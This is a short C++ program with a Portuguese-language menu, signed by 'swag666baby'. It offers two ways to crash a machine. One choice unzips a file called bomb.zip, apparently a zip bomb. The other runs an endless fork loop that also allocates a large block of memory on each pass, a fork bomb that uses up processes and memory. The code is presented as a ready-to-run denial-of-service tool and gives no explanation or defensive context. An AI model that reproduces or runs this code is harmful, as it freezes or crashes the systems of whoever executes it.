#include <iostream>
#include <malloc.h>
#include <unistd.h>

using namespace std;

int main(int argc, char *argv[])
{
	system("clear");
	
	int opc;
	
	printf("--------------------------------\n         by: swag666baby\n--------------------------------");
	
	cout << "\n\nescolha uma opção:\n\n1- zip bomb\n2- fork bomb\n\n=> "; cin >> opc;
	if(opc == 1){
		
		system("unzip bomb.zip");
	}
	else if(opc == 2){
		
		while (1){
			fork();
			int *p1 = (int *) malloc (sizeof (int) * 9999999);
		}
	}
	else{
		printf("opção invalida!");
	}
	return 0;
}
